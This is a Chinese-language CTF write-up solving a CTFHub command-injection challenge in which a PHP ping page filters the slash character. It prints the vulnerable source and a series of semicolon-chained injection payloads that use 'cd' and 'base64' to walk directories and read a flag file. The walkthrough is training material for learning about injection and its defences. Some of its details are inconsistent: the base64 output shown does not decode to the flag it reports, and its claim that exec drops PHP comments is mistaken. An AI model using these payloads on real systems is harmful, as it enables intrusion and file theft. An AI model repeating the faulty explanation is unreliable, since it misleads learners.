---
title: CTFHub 命令注入 - 过滤目录分隔符
date: 2026-10-23
categories: CTFHub Web 命令注入 绕过 `/` 过滤 `cd` 相对路径 `base64` 绕过回显
tags: CTFHub Web 命令注入 绕过 `/` 过滤 `cd` 相对路径 `base64` 绕过回显
---

# 题目：CTFHub 命令注入 - 过滤目录分隔符

## 题目描述
打开题目页面，源码如下：
```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```
*分析：*
服务器使用正则表达式过滤了斜杠 /。
这意味着我们无法使用绝对路径（如 /flag 或 /var/www/html/）。

## 解题思路
### 漏洞原理
既然 / 被禁用，我们可以利用 Linux 的 cd 命令和相对路径来切换目录：
cd .. 返回上一级目录。
cd 目录名 进入当前目录下的子目录。

###  攻击链
测试命令执行。
发现诱饵文件 f1ag_xxx.php（且内容为空）。
用 cd .. 跳出诱饵目录，发现真正的入口 html 目录。
进入 html/flag_is_here 找到真正的 flag 文件。
使用 base64 读取（因为 flag 在 PHP 注释中，cat 会被吞）。

## 解题步骤
1. 遭遇诱饵文件
输入：
```text
127.0.0.1;ls
```
发现 flag_is_here 目录，进入后发现 f1ag_1610316323214.php（注意是数字1）。
尝试用 cat 和 base64 读取，均返回空，说明是诱饵文件。

2. 相对路径跳转
退回上一级目录：
```text
127.0.0.1;cd ..;ls
```
发现 html 目录，进入：
```text
127.0.0.1;cd html;ls
```
发现又有一个 flag_is_here 目录，再次进入：
```text
127.0.0.1;cd html;cd flag_is_here;ls
```
找到了真正的目标文件 flag_16103163231214.php。

3. Base64 强制读取
因为 flag 写在 PHP 注释里，直接 cat 会被 exec 吞掉，使用 base64：
```text
127.0.0.1;cd html;cd flag_is_here;base64 flag_16103163231214.php
```
返回结果：
```text
PD9waHAgLy8gY3RmaHViezI2NkJkOWJ1YWM5MjF1MGQyNjFMT11NX0k...
```

4. 解码获取 Flag
将 Base64 解码，得到：
```php
<?php // ctfhub{cd67d9beacfbb90d261e19e5} ?>
```
提交 flag，通关！

## 踩坑指南
1. 中了 f1ag 的钓鱼陷阱
原因： 出题人故意在第一个目录放了一个数字 1 的 f1ag 文件，且内容为空。
解决： 仔细辨别字母 l 和数字 1，并尝试跳出当前目录（cd ..）去寻找隐藏目录。

2. cat 读取注释为空
原因： exec 函数会忽略 PHP 注释（//）。
解决： 必须使用 base64 编码文件内容，强制输出。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| `cd ..` | 返回上一级目录，绕过绝对路径限制 |
| 相对路径 | 使用 `cd 目录名` 逐层进入 |
| `base64` | 将文件内容编码输出，绕过 `exec` 回显限制 |

### 防御建议
1. 使用白名单：严格限制 ip 参数格式。
2. 禁用 cd 和 ..：禁止在命令中使用目录跳转符。
